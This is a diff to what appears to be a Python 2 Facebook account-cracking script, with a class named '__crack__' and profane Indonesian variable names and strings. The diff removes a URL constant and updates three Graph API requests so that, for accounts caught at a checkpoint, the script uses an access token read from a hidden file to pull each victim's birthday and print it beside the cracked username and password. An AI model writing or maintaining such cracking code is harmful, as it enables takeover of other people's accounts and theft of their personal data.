@@ -69,7 +69,6 @@ user = []
 loop = 0
 xi_jimpinx = '1714000985456399'
 koh = '100005395413800'
-url = "https://mbasic.facebook.com"
 hoetank = random.choice(['Yang posting orang nya ganteng:)', 'Lo ngentod:v', 'Never surrentod tekentod kentod:v'])
 bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
 
@@ -649,7 +648,7 @@ class __crack__:
             elif 'www.facebook.com' in response.json()['error_msg']:
                 try:
                     kontol = open('.memek.txt').read()
-                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
+                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
                     print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
@@ -700,7 +699,7 @@ class __crack__:
             elif "checkpoint" in ses.cookies.get_dict().keys():
                 try:
                     kontol = open('.memek.txt').read()
-                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
+                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
                     print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
@@ -751,7 +750,7 @@ class __crack__:
             elif "checkpoint" in ses.cookies.get_dict().keys():
                 try:
                     kontol = open('.memek.txt').read()
-                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
+                    cp_ttl = requests.get('https://graph.facebook.com/%s?fields=birthday&access_token=%s'%(user,kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
                     print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
